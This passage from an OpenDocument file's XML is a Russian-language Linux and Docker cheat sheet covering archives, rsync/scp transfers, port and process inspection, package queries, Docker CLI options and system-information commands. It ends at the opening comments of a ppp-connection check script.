      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">wget</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">qO</text:span><text:span text:style-name="T1">- </text:span><text:span text:style-name="T3">eth</text:span><text:span text:style-name="T1">0.</text:span><text:span text:style-name="T3">me</text:span><text:span text:style-name="T1"> - Узнать внешний </text:span><text:span text:style-name="T3">IP</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">uptime</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">man</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> - документация/инструкция по указанному пакету</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Работа с архивами:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создать .</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gz</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">czvf</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gz</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">full</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1"> - создать .</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gz</text:span><text:span text:style-name="T1"> (архив)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">cjvf</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">bz</text:span><text:span text:style-name="T1">2 /</text:span><text:span text:style-name="T3">full</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1"> - создать .</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">bz</text:span><text:span text:style-name="T1">2 (архив)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Распаковать .</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">xvf</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gz</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Распаковать </text:span><text:span text:style-name="T3">gz</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">gunzip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">yourfile</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gz</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Распаковать многотомный архив: 7</text:span><text:span text:style-name="T3">za</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">arch</text:span><text:span text:style-name="T1">.7</text:span><text:span text:style-name="T3">z</text:span><text:span text:style-name="T1">.001</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Получить листинг файлов в архиве: </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">tf</text:span><text:span text:style-name="T1"> &lt;</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">to</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">tarfile</text:span><text:span text:style-name="T1">&gt;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Извлечь конкретный файл из архива: tar -xf &lt;path_to_tarfile&gt; [&lt;file_1_in_archive&gt; &lt;file_2_in_archive&gt; ..]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Скопировать файл на сервер: </text:span><text:span text:style-name="T3">scp</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">P</text:span><text:span text:style-name="T1"> 12322 </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">login</text:span><text:span text:style-name="T1">@111.111.111.111:/</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">user</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Быстрый совет дня для </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">: Удалите пустые строки при отображении содержимого файла с помощью </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1">, например: $ </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> . </text:span><text:span text:style-name="T3">filename</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Утилиты </text:span><text:span text:style-name="T3">linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">rsync</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">v</text:span><text:span text:style-name="T1"> - выводит подробную информацию о процессе копирования;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[-</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1">] - сохраняет все атрибуты оригинальных файлов;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1"> - не перезаписывать более новые файлы;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> - копирует символьные ссылки;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">L</text:span><text:span text:style-name="T1"> - копирует содержимое ссылок;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T1"> - сохраняет права для файлов;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> - сохраняет время модификации;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">e</text:span><text:span text:style-name="T1"> - использовать другой транспорт, например, </text:span><text:span text:style-name="T3">ssh</text:span><text:span text:style-name="T1">;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[-</text:span><text:span text:style-name="T3">z</text:span><text:span text:style-name="T1">] - </text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1">жимает файлы перед передачей;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s/>- </text:span><text:span text:style-name="T3">recursive</text:span><text:span text:style-name="T1"> - перебирать директории рекурсивно;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s/>- </text:span><text:span text:style-name="T3">exclude</text:span><text:span text:style-name="T1"> - Исключить файлы по шаблону;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры: </text:span><text:span text:style-name="T3">rsync</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">avz</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">skillproject</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1">/ . - из подкаталога в текущий каталог</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">rsync</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">avz</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">skillproject</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1">/ </text:span><text:span text:style-name="T3">aaa</text:span><text:span text:style-name="T1">/ - из подпапки в подпапку </text:span><text:span text:style-name="T3">aaa</text:span><text:span text:style-name="T1">/</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">rsync</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">avz</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">skillproject</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1">/ </text:span><text:span text:style-name="T3">digita</text:span><text:span text:style-name="T1">6</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">digita</text:span><text:span text:style-name="T1">6</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">beget</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tech</text:span><text:span text:style-name="T1">:/</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">digita</text:span><text:span text:style-name="T1">6</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">code</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">skills</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ru</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">html</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sources</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">skillproject</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1">/ - передача на удаленный сервер</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">rsync</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">avze</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ssh</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">skillproject</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1">/ </text:span><text:span text:style-name="T3">digita</text:span><text:span text:style-name="T1">6</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">digita</text:span><text:span text:style-name="T1">6</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">beget</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tech</text:span><text:span text:style-name="T1">:/</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">digita</text:span><text:span text:style-name="T1">6</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">code</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">skills</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ru</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">html</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sources</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">skillproject</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1">/ - то же самое м явным указанием </text:span><text:span text:style-name="T3">ssh</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">ss</text:span><text:span text:style-name="T1">: -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> или - </text:span><text:span text:style-name="T3">listening</text:span><text:span text:style-name="T1"> - посмотреть только прослушиваемые порты;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T1"> или - </text:span><text:span text:style-name="T3">program</text:span><text:span text:style-name="T1"> - показать имя программы и ее </text:span><text:span text:style-name="T3">PID</text:span><text:span text:style-name="T1">;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> или - </text:span><text:span text:style-name="T3">tcp</text:span><text:span text:style-name="T1"> - показать </text:span><text:span text:style-name="T3">tcp</text:span><text:span text:style-name="T1"> порты;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1"> или - </text:span><text:span text:style-name="T3">udp</text:span><text:span text:style-name="T1"> показать </text:span><text:span text:style-name="T3">udp</text:span><text:span text:style-name="T1"> порты;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> или - </text:span><text:span text:style-name="T3">numeric</text:span><text:span text:style-name="T1"> показывать </text:span><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> адреса в числовом виде.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры: </text:span><text:span text:style-name="T3">ss</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">tlpn</text:span><text:span text:style-name="T1"> - проверить все прослушивающие </text:span><text:span text:style-name="T3">tcp</text:span><text:span text:style-name="T1">-порты</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ss</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">tulpn</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> :80 - показать все процессы, работающие на 80-м порту</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">e</text:span><text:span text:style-name="T1"> - показать все процессы</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">ef</text:span><text:span text:style-name="T1"> - показать подробную информацию о каждом процессе</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">ef</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">phantom</text:span><text:span text:style-name="T1"> - найти все процессы с именем </text:span><text:span text:style-name="T3">phantom</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mpstat</text:span><text:span text:style-name="T1">: Показывает статистику загрузки процессора. Команды:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mpstat</text:span><text:span text:style-name="T1"> - показывает общую информацию</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mpstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">P</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ALL</text:span><text:span text:style-name="T1"> - по каждому ядру</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">free</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Показывает потребление ОЗУ на текущий момент: </text:span><text:span text:style-name="T3">free</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">h</text:span><text:span text:style-name="T1"> - показывает информацию в гигабайтах (более человеко читаемо, чем в байтах)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1">: Что-то наподобие диспетчера задач, только для линукс, показывает попроцессное потребление озу</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dpkg</text:span><text:span text:style-name="T1">: Пакетный менеджер для </text:span><text:span text:style-name="T3">debian</text:span><text:span text:style-name="T1"> систем (не путать с системой управления пакетами - </text:span><text:span text:style-name="T3">apt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">apt</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">get</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dpkg</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> &lt;</text:span><text:span text:style-name="T3">packname</text:span><text:span text:style-name="T1">&gt; - проверить, установлен ли пакет</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dpkg</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> - список всех пакетов</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dpkg</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">apache</text:span><text:span text:style-name="T1">2 - проверить, установлен ли конкретный пакет</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dpkg</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">i</text:span><text:span text:style-name="T1"> &lt;</text:span><text:span text:style-name="T3">package</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">deb</text:span><text:span text:style-name="T1">&gt; - установить пакет</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">pnltu</text:span><text:span text:style-name="T1"> - посмотреть список используемых портов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Docker справочник cli</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker images - показать все локальные образы docker</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker rmi [-f] &lt;id|label&gt; - удалить образ c локальной машины</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker rmi -f $(docker images -q) - удалить все докер образы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker build [-t &lt;label&gt;] &lt;path&gt; - построить образ на основе докерфайла</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">docker run [-dt] [--name &lt;name&gt;] [-v &lt;path:path&gt;] [-p &lt;port:port&gt;] [--...] </text:span><text:span text:style-name="T1">&lt;id|label&gt; [cmd] - запустить образ в контейнере c cmd-командой (необязательно)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-d - в фоновом режиме</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-t - прикрепляет к контейнеру терминал</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-i - перенаправляет ввод/вывод на текущий терминал</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">--name - явно указать имя контейнера, по которому можно будет обращаться к нему (иначе будет сгенерировано рэндомно)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">-p &lt;external_port:internal_port&gt; - </text:span><text:span text:style-name="T1">проброс</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">портов</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">-v --volume &lt;external_path:internal_path&gt; - </text:span><text:span text:style-name="T1">монтирует</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">папки</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">хоста</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">контейнер</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">--rm - удаляет контейнер после завершения работы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">--memory &lt;n&gt; - позволяет указать количество ОЗУ, доступной контейнеру</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-P - пробрасывает все порты контейнера в хост-систему</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">--expose - позволяет пробросить несколько портов из контейнера в хост-систему</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-e &lt;"FOO=bar"&gt; - добавляет переменную окружения в контейнер</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">docker ps [-a] - показать все запущенные [существующие] докер контейнеры</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">docker ps -q | xargs docker stats - no-stream` - посмотреть ресурсы, потребляемые запущенными контейнерами</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker stop &lt;name&gt; - останавливает указанный образ (с сохранением данных)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker kill &lt;name&gt; - то же самое без сохранения данных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker rm &lt;name&gt; - удаляет указанный контейнер</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker attach &lt;name&gt; - подключиться к выбранному докер-контейнеру</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker exec [-ti] &lt;name&gt; &lt;cmd&gt; - выполняет команду в докер-контейнере</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker push &lt;imagename&gt; - отправить образ в удаленный реестр</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker ps -q | xargs <text:s/>docker stats --no-stream - посмотреть нагрузку на процессор и память каждого из контейнеров</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker stats - похожа на предыдущую команду, но более короткая</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker info --format '{{.LoggingDriver}}' - посмотреть используемый по умолчанию лог драйвер (json-file)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">docker logs [&lt;container_name&gt;] [-f --tail 100] - показать логи [конкретного контейнера] в терминал [последние 100 строк]</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">docker inspect --format='{{.LogPath}}' &lt;containername&gt; -показать, где хранятся логи для конкретного контейнера</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Основные команды Linux: Системная информация</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">date - вывести текущую дату и время</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[ммддччмм[гг]].сс - установка даты и времени (мм - месяц, дд - дата, чч - час, мм - минут, гг - год, сс - секунд)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cal - вывести календарь на текущий месяц</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">uptime - показать текущий аптайм</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">uname - показать информацию о ядре</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-s - Показать имя ядра (информация выдается по умолчанию, если ни одна опция не указана)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-n - Показать имя хоста.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-r - Показать номер выпуска ядра. Эта опция часто используется с командами управления модулями.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-v - Показать версию ядра.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-m - Показать имя аппаратной платформы (CPU).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-o - Показать имя операционной системы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-a - Показать всю возможную информацию.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">cat /proc/cpuinfo - информация ЦПУ</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cat /proc/meminfo - информация о памяти</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">df - показать инф. о использовании дисков</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-t - указание типа ФС</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-h - в “понятном” виде</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-T - отображение типа ФС</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-i - отображение информации об inode</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-x fstype - исключение вывода по типу ФС</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">du - вывести “вес” текущего каталога</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-s - с подкаталогами</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-h - в “понятном” виде</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">-m - вывод в мегабайтах</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">dmidecode - информация о железе, берется из API DMI (пакет pmtools)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-t– указать тип устройства</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-t 17 - информация о памяти</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-q - вывод меньшей информации</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">free - использование памяти и swap</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">whereis file– отображение расположения файла file</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">which app - отображает путь к команде app</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">type app - аналог каманды which</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">enable - вывод встроенных в интерпретатор команд</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">lshw - обтображение списка устройств</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">lsmod - список подключенный модулей ядра</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">modprobe modulemane - добавления и удаления модулей ядра Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">modinfo modulename - информация о модуле modulename</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">-F param - отображение только параметра param для модуля</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Команды Linux, которые должен выучить каждый разработчик:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">find - https://bit.ly/3C33Py0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">grep - https://bit.ly/3zWDxL5</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">curl - https://bit.ly/3wzSFgM</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">lsof - https://bit.ly/3Q2h5Xi</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">chmod - https://bit.ly/3bOP0oj</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tar - https://bit.ly/3vXKSc7</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">netstat - https://bit.ly/3JQuEY6</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скрипт проверки активности всех ppp-соединений</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># если по тоннелю пинга нет, то осуществляется разрыв тоннеля для переподключения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># внимание ! скрипт будет отключать активное vpn-соединение с админом, т.к. до него пинга не будет !</text:span></text:p>
